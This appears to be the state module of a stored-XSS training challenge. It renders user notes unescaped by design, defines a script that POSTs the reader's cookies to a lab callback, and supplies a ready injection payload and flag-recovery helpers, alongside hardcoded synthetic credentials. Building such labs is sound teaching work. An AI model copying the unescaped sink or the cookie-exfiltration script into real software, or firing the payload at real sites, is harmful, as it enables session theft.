"""Deterministic note-board state for the stored-XSS training challenge.

Note text is rendered verbatim (no HTML escaping) in :func:`render_page`;
that verbatim sink is the intended stored cross-site scripting
vulnerability. The flag is a committed synthetic lab constant carried in
the admin session cookie; never copy this construction into production.
"""
import os
import re

FLAG = "T3MP3ST{st0r3d_xss_c00kie_th3ft}"
FLAG_RE = re.compile(r"T3MP3ST\{[a-zA-Z0-9_]+\}")

ADMIN_USER = "admin"
ADMIN_PASS = "T3mp3st-4dmin-2026"
SESSION_TOKEN = "ctf-admin-session-01"
SESSION_COOKIE_NAME = "ctf_session"
FLAG_COOKIE_NAME = "ctf_flag"

SEED_NOTE = "Weekly sync. Keep this board clean."
MAX_NOTE = 512
# Browser-facing exfil path, owned by the gateway (same origin as the board).
# In the live lab the gateway forwards it to the internal callback service,
# so exfiltration reaches the host only through the allow-list gateway.
CALLBACK_PATH = "/cb"
CALLBACK_BASE = os.environ.get("CALLBACK_BASE", "")

_NOTES: list[str] = [SEED_NOTE]


def add_note(text: str) -> int:
    """Append a note verbatim; the caller enforces type and length bounds."""
    _NOTES.append(text)
    return len(_NOTES)


def notes() -> list[str]:
    return list(_NOTES)


def admin_cookie_header() -> str:
    """The exact Cookie header the admin browser presents; it carries the flag."""
    return f"{SESSION_COOKIE_NAME}={SESSION_TOKEN}; {FLAG_COOKIE_NAME}={FLAG}"


def exfil_payload() -> str:
    """Stored note whose injected script exfiltrates the reader's cookies."""
    return "<script>window.ctfCollect()</script>"


def render_page(notes_list: list[str] | None = None) -> str:
    """Render the shared board.

    Each note is inserted verbatim (the XSS sink) and the page defines a
    single helper, ``window.ctfCollect``: a fetch of ``document.cookie`` to
    the lab callback. A stored payload firing that helper is the exfiltration.
    """
    items = "\n".join(
        f'<li class="note">{text}</li>'
        for text in (notes_list if notes_list is not None else _NOTES)
    )
    return (
        '<!doctype html><html><head><meta charset="utf-8">'
        "<title>T3MP3ST shared notes</title>"
        f'<script>window.ctfCollect=function(){{fetch("{CALLBACK_BASE}{CALLBACK_PATH}",'
        '{method:"POST",body:document.cookie});return document.cookie;};</script>'
        f'</head><body><h1>Shared notes</h1><ul>\n{items}\n</ul>'
        "<p class=hint>POST /notes to add a note; POST /login to sign in as admin.</p>"
        "</body></html>"
    )


def payload_script_calls(html: str) -> int:
    """Count stored ``ctfCollect()`` calls the browser sim will fire per read."""
    return len(re.findall(r"window\.ctfCollect\(\)", html))


def parse_cookies(header: str) -> dict[str, str]:
    cookies: dict[str, str] = {}
    for part in (header or "").split(";"):
        name, _, value = part.strip().partition("=")
        if name:
            cookies[name] = value
    return cookies


def recover_flag(cookie_body: str) -> str:
    """Pull the flag out of a cookie header exfiltrated to the callback."""
    return parse_cookies(cookie_body).get(FLAG_COOKIE_NAME, "")
